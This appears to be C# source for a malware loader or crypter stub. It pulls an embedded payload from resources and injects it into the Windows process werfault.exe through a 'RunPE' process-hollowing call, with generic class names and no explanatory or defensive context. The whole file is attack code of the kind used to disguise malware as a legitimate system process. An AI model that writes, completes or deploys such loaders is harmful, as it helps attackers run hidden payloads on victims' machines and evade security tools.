using System;
using System.IO;
using System.Runtime.InteropServices;

namespace A
{
    public class class1
    {
        public static void method1()
        {
            byte[] Payload = ResourceGetter.GetPayload();

            string frameworkPath = RuntimeEnvironment.GetRuntimeDirectory();
            string cscPath = Path.Combine(frameworkPath, "csc.exe");

            string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string winLogonPath = Path.Combine(sysPath, "werfault.exe");

            RunPE.Run(winLogonPath, string.Empty, Payload, true);
        }
    }
}
